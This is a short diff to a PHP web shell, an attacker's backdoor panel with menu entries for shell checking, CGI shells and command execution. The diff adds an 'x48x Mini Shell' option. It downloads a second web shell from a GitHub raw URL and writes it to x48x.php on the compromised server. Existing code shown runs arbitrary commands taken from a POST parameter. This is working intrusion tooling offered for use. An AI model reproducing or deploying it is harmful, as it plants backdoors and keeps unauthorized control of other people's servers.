@@ -399,6 +399,7 @@ echo "<li>[ <a href='?dir=$dir&k3=shellchk'>Shell Checker</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=shelscan'>Shell Finder</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=cgi'>CGI Shell</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=cgi2'>CGI Shell 2</a> ]</li>";
+echo "<li>[ <a href='?dir=$dir&k3=x48x'>x48x Mini Shell</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=zip'>Zip Menu</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=about'>About</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&k3=metu'>LogOut</a> ]<br></li>";
@@ -442,7 +443,12 @@ elseif($_GET['k3'] == 'cgi2') {
 		echo "<pre>".exe($_POST['cmd'])."</pre>";
 	}
 } 
-
+elseif($_GET['k3'] == 'x48x'){
+	$file = file_get_contents('https://raw.githubusercontent.com/Fay48/WebShell/master/x48x.phtml');
+	$x48x = fopen("x48x.php", "w");
+	fwrite($x48x, $file);
+	fclose($x48x);
+}
 elseif($_GET['k3'] == 'cgi') {
 	$cgi_dir = mkdir('kthree_cgi', 0755);
         chdir('kthree_cgi');
